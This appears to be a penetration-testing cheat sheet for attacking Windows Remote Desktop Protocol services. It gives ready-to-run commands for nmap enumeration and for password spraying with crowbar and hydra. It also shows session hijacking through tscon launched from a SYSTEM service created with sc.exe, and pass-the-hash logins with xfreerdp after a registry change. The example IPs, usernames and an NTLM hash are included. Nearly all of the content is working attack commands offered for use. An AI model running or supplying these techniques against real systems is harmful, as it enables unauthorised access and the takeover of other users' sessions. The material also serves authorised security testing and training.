#  Remote Desktop Protocol (RDP)
## Enumeration

```
nmap -Pn -p3389 $rhost
```
## Misconfigurations

Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.
Using the [Crowbar tool](https://github.com/galkan/crowbar), we can perform a password spraying attack against the RDP service. 

```
crowbar -b rdp -s $rhost -U users.txt -c 'password123' # Example
```
### Hydra - RDP Password Spraying
```
hydra -L usernames.txt -p 'password123' $rhost rdp
```

### RDP Login
```
rdesktop -u $username -p $password $rhost
rdesktop -u admin -p password123 192.168.2.143 # Example
```

## RDP Session Hijacking

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the [Microsoft tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.

```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). 
A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. 
Once we run the following command, a service named sessionhijack will be created.

```
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

## RDP Pass-the-Hash (PtH)

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:$rhost /u:$user /pth:$hash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9 # Example

```



